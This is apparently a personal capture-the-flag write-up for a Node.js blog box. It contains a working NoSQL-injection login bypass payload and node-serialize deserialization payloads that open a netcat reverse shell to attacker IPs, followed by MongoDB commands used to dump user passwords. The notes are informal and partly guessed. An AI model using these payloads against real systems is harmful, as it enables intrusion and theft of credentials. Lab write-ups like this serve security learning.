site was running on node.js but on burp we can change the Content-Type to ==application/json==

```
{"user":"admin","password":{
"$ne":"admin"
}}
```

and we by passed the login page using ==json==

it says we need to upload a ==xml== file .. in my notes thm -> xml the ode is right and we get rce

when we did login error we found a file /opt/blog/server.js .. server.js part is guessed as it is very common

we did and we found we have to ==deserialize== and we got notes of that too in languages section

we did itÂ  this with initial papremter but it didnot work

```
{"user":"admin","sign":"23e112072945418601deb47d9a6c7de8","email":"_$$ND_FUNC$$_function(){\n \t require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.18.4.243 4444 >/tmp/f',function(error,stdout,stderr) {console.log(stdout)});\n }()"}
```

so we did this with only the code parameter and it worked

```
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('rm /tmp/f;mkfifo 
/tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.9 4444 >/tmp/f', function(error, stdo
ut, stderr){console.log(stdout)});}()"}
```

we need to do it with ==burp as we are using GET method== not POST and normally adding it to cookies did it with post

we got shell

and on checking ps -ef ..it was running ==mogodb==

```
use blog
switched to db blog
> show collections
articles
users
> db.users.find()
```

we got password

and root was for ALL:ALL
